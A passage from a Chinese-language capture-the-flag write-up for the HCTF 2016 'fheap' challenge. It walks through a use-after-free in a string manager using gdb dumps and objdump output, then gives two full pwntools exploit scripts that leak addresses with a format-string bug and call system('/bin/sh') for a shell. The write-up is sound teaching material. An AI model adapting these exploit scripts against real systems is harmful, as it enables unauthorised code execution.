class="number">3u</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(_QWORD, <span class="keyword">const</span> <span class="keyword">char</span> *))(*((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>) + <span class="number">24L</span>L))(</span><br><span class="line">        *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>),</span><br><span class="line">        <span class="string">"yes"</span>);</span><br><span class="line">      *((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * v1) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到，delete的时候并未判断string是否存在，free之后并没有将改地址设为NULL。因此有很明显的double free漏洞。</p><h4 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h4><p>checksec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  checksec</span><br><span class="line">[+] checksec <span class="keyword">for</span> <span class="string">'/mnt/hgfs/shared/2016HCTF fheap/fheap'</span></span><br><span class="line">Canary                        : Yes</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : Yes</span><br><span class="line">Fortify                       : No</span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure><p>首先create两个&lt;=0xf的string，查看堆空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /mnt/hgfs/shared/2016HCTF fheap/fheap</span><br><span class="line">0x0000555555755000 0x0000555555756000 0x0000000000001000 r-- /mnt/hgfs/shared/2016HCTF fheap/fheap</span><br><span class="line">0x0000555555756000 0x0000555555757000 0x0000000000002000 rw- /mnt/hgfs/shared/2016HCTF fheap/fheap     <span class="comment">#可读写段</span></span><br><span class="line">0x0000555555757000 0x0000555555778000 0x0000000000000000 rw- [heap]  <span class="comment">#堆起始地址</span></span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fda000 0x00007ffff7fdd000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br><span class="line">gef➤  x /20gx 0x0000555555757000</span><br><span class="line">0x555555757000:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757010:0x0000000a616161610x0000000000000000  <span class="comment">#chunk1</span></span><br><span class="line">0x555555757020:0x00000000000000050x0000555555554d52</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757040:0x0000000a626262620x0000000000000000  <span class="comment">#chunk2</span></span><br><span class="line">0x555555757050:0x00000000000000050x0000555555554d52</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000020fa1</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>先delete chunk1，再delete chunk0，查看堆空间以及fastbins</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /20gx 0x0000555555757000</span><br><span class="line">0x555555757000:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757010:0x00005555557570300x0000000000000000</span><br><span class="line">0x555555757020:0x00000000000000050x0000555555554d52</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000050x0000555555554d52</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000020fa1</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">gef➤  heap bins</span><br><span class="line">[+] No Tcache <span class="keyword">in</span> this version of libc</span><br><span class="line">─────────────────────────────────────────── Fastbins <span class="keyword">for</span> arena 0x7ffff7dd1b20 ───────────────────────────────────────────</span><br><span class="line">Fastbins[idx=0, size=0x10] 0x00</span><br><span class="line">Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x555555757010, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757040, size=0x30, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=2, size=0x30] 0x00</span><br><span class="line">Fastbins[idx=3, size=0x40] 0x00</span><br><span class="line">Fastbins[idx=4, size=0x50] 0x00</span><br><span class="line">Fastbins[idx=5, size=0x60] 0x00</span><br><span class="line">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure><p>下面查看string list（unk_2020C0 ）的内容。string list在.bss段，该段为可读写段，可读写段从plt表开始。由上面的vmmap可知可读写段地址为<code>0x0000555555756000</code>，ida中查看偏移</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000202000                 dq offset stru_201DF0</span><br><span class="line">.got.plt:0000000000202008 qword_202008    dq 0                    ; DATA XREF: sub_950↑r</span><br><span class="line">.got.plt:0000000000202010 qword_202010    dq 0                    ; DATA XREF: sub_950+6↑r</span><br><span class="line">.got.plt:0000000000202018 off_202018      dq offset free          ; DATA XREF: _free↑r</span><br><span class="line">.got.plt:0000000000202020 off_202020      dq offset strncpy       ; DATA XREF: _strncpy↑r</span><br><span class="line">...</span><br><span class="line">.bss:00000000002020C0 unk_2020C0      db    ? ;               ; DATA XREF: sub_D95:loc_DE9↑o</span><br><span class="line">.bss:00000000002020C0                                         ; sub_D95+C1↑o ...</span><br></pre></td></tr></table></figure><p>偏移为0xc0，因此string list的地址为<code>0x00005555557560c0</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /10gx 0x00005555557560c0</span><br><span class="line">0x5555557560c0:0x00000000000000000x0000555555757010</span><br><span class="line">0x5555557560d0:0x00000000000000000x0000555555757040</span><br><span class="line">0x5555557560e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557560f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756100:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到free后的堆地址仍然存在。</p><p>接着create大小为0x20的string，查看堆空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /20gx 0x0000555555757000</span><br><span class="line">0x555555757000:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757010:0x00005555557570400x0000000000000000</span><br><span class="line">0x555555757020:0x00000000000000200x0000555555554d6c</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757040:0x31313131313131310x3232323232323232</span><br><span class="line">0x555555757050:0x33333333333333330x3434343434343434</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000020fa1</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>发现了uaf漏洞。</p><p>利用思路如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">根据调用free函数的地址找到puts函数地址</span><br><span class="line">puts函数泄漏程序基地址</span><br><span class="line">根据程序基地址找到printf函数地址</span><br><span class="line">利用printf的fmt漏洞泄漏libc基地址</span><br><span class="line">根据libc基地址找到system函数地址</span><br><span class="line">调用system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>第一步：根据调用free函数的地址找到puts函数地址</p><p>查看puts函数在程序中的偏移</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜ objdump -d -M intel fheap | grep puts</span><br><span class="line">0000000000000990 &lt;puts@plt&gt;:</span><br><span class="line">     c54:e8 37 fd ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">     c60:e8 2b fd ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">     c6c:e8 1f fd ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">     d1a:e8 71 <span class="built_in">fc</span> ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">     d2d:e8 5e <span class="built_in">fc</span> ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">     de4:e8 a7 fb ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">     f31:e8 5a fa ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">     f83:e8 08 fa ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">    100d:e8 7e f9 ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">    1119:e8 72 f8 ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">    1156:e8 35 f8 ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">    1162:e8 29 f8 ff ff       call   990 &lt;puts@plt&gt;</span><br><span class="line">    116e:e8 1d f8 ff ff       call   990 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure><p>因此将调用free函数的偏移改成调用puts函数(这里为0x0000555555554d52）的偏移即可。这里选用0xd2d，其实只用修改最后一个字节就可以了</p><p>第二步：puts函数泄漏程序基地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="string">"aaaaa"</span>)</span><br><span class="line">create(<span class="string">"bbbbb"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="number">24</span> * <span class="string">'a'</span> + <span class="string">'\x2d'</span></span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="number">24</span>*<span class="string">'a'</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xd2d</span>   <span class="comment">#减掉偏移</span></span><br><span class="line">log.success(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br></pre></td></tr></table></figure><p>第三步：根据程序基地址找到printf函数地址</p><p>查看printf函数在程序中的偏移</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜ objdump -d -M intel fheap | grep <span class="built_in">printf</span></span><br><span class="line">00000000000009d0 &lt;<span class="built_in">printf</span>@plt&gt;:</span><br><span class="line">     dbb:e8 10 <span class="built_in">fc</span> ff ff       call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">     e19:e8 b2 fb ff ff       call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">     f0a:e8 c1 fa ff ff       call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">     f56:e8 75 fa ff ff       call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">    10ee:e8 dd f8 ff ff       call   9d0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br></pre></td></tr></table></figure><p>printf_addr = elf_base + 0xdbb</p><p>第四步：利用printf的fmt漏洞泄漏libc基地址</p><p>首先需要再栈中找到一个libc中的函数，首先测试一下fmt泄漏栈中数据的偏移，例如<code>%6$p</code>打印出栈中第二个地址中的数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 30</span><br><span class="line">0000| 0x7fff7f5641d0 --&gt; 0x563315439c8f (test   rax,rax)</span><br><span class="line">0008| 0x7fff7f5641d8 --&gt; 0x563315439e95 (lea    rax,[rip+0x201224]        # 0x56331563b0c0)</span><br><span class="line">0016| 0x7fff7f5641e0 --&gt; 0x0 </span><br><span class="line">0024| 0x7fff7f5641e8 --&gt; 0x100000000 </span><br><span class="line">0032| 0x7fff7f5641f0 --&gt; 0xa736579 (&apos;yes\n&apos;)</span><br><span class="line">0040| 0x7fff7f5641f8 --&gt; 0x0 </span><br><span class="line">0048| 0x7fff7f564200 --&gt; 0x0 </span><br><span class="line">0056| 0x7fff7f564208 --&gt; 0x0 </span><br><span class="line">0064| 0x7fff7f564210 --&gt; 0x0 </span><br><span class="line">0072| 0x7fff7f564218 --&gt; 0x0 </span><br><span class="line">0080| 0x7fff7f564220 --&gt; 0x0 </span><br><span class="line">0088| 0x7fff7f564228 --&gt; 0x0 </span><br><span class="line">0096| 0x7fff7f564230 --&gt; 0x0 </span><br><span class="line">0104| 0x7fff7f564238 --&gt; 0x0 </span><br><span class="line">0112| 0x7fff7f564240 --&gt; 0x0 </span><br><span class="line">0120| 0x7fff7f564248 --&gt; 0x0 </span><br><span class="line">0128| 0x7fff7f564250 --&gt; 0x0 </span><br><span class="line">0136| 0x7fff7f564258 --&gt; 0x7fbb1fe55bff (&lt;_IO_new_file_write+143&gt;:test   rax,rax)</span><br></pre></td></tr></table></figure><p>找到第18个地址中的数据为libc函数地址，fmt为<code>%22$p</code>。计算偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p 0x7fbb1fe55bff-0x00007fbb1fddd000</span><br><span class="line">$3 = 0x78bff</span><br></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#泄漏libc基地址</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload =  <span class="string">'b'</span> * <span class="number">8</span> + <span class="string">'%22$p'</span> + <span class="string">'b'</span>*<span class="number">11</span> + p64(printf_addr)</span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc_base = int(p.recv()[<span class="number">10</span>:<span class="number">22</span>],<span class="number">16</span>) - <span class="number">0x78bff</span></span><br><span class="line">log.success(<span class="string">'libc_base:'</span>+hex(libc_base))</span><br></pre></td></tr></table></figure><p>第五步：根据libc基地址找到system函数地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><p>第六步：调用system(“/bin/sh”)</p><p>这里有一个小问题，如何传<code>/bin/sh</code>？解决办法<code>/bin/sh;</code></p><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./fheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./fheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(s)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"quit\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"create str"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">p.sendline(str(len(s)))</span><br><span class="line">p.recvuntil(<span class="string">"str:"</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"quit\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"delete str"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"sure?:"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏程序基地址</span></span><br><span class="line">create(<span class="string">"aaaaa"</span>)</span><br><span class="line">create(<span class="string">"bbbbb"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="number">24</span> * <span class="string">'a'</span> + <span class="string">'\x2d'</span></span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="number">24</span>*<span class="string">'a'</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xd2d</span></span><br><span class="line">log.success(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line">printf_addr = elf_base + <span class="number">0xdbb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏libc基地址</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload =  <span class="string">'b'</span> * <span class="number">8</span> + <span class="string">'%22$p'</span> + <span class="string">'b'</span>*<span class="number">11</span> + p64(printf_addr)</span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc_base = int(p.recv()[<span class="number">10</span>:<span class="number">22</span>],<span class="number">16</span>) - <span class="number">0x78bff</span></span><br><span class="line">log.success(<span class="string">'libc_base:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'\x0a'</span>)  <span class="comment">#回车使程序继续运行</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">'/bin/sh;'</span> + <span class="string">'a'</span>*<span class="number">16</span> + p64(system_addr)</span><br><span class="line">create(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>在不知道libc版本的情况下，可以利用DynELF泄漏system地址，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./fheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./fheap"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line"><span class="comment">#print hex(libc.symbols['system'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(s)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"quit\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"create str"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">p.sendline(str(len(s)))</span><br><span class="line">p.recvuntil(<span class="string">"str:"</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"quit\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"delete str"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"sure?:"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏程序基地址</span></span><br><span class="line">create(<span class="string">"aaaaa"</span>)</span><br><span class="line">create(<span class="string">"bbbbb"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="number">24</span> * <span class="string">'a'</span> + <span class="string">'\x2d'</span></span><br><span class="line">create(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="number">24</span>*<span class="string">'a'</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xd2d</span></span><br><span class="line">log.success(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line">printf_addr = elf_base + <span class="number">0xdbb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏libc基地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload =  <span class="string">'b'</span> * <span class="number">8</span> + <span class="string">'%10$s'</span> + <span class="string">'b'</span>*<span class="number">11</span> + p64(printf_addr)</span><br><span class="line">    create(payload)</span><br><span class="line">    pay =  <span class="string">'yes11111'</span> +  p64(addr)</span><br><span class="line">    p.recvuntil(<span class="string">'3.quit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'delete '</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Are you sure?:'</span>)</span><br><span class="line">    p.sendline(pay)</span><br><span class="line">    p.recvuntil(<span class="string">'bbbbbbbb'</span>)</span><br><span class="line">    context = p.recvuntil(<span class="string">'bb'</span>)[:<span class="number">-2</span>] + <span class="string">"\x00"</span></span><br><span class="line">    print(<span class="string">"%#x -&gt; %s"</span> %(addr, (context <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    p.sendline(<span class="string">'\x0a'</span>)</span><br><span class="line">    <span class="keyword">return</span> context</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf_base,elf = elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#回车使程序继续运行</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">'/bin/sh;'</span> + <span class="string">'a'</span>*<span class="number">16</span> + p64(system_addr)</span><br><span class="line">create(payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
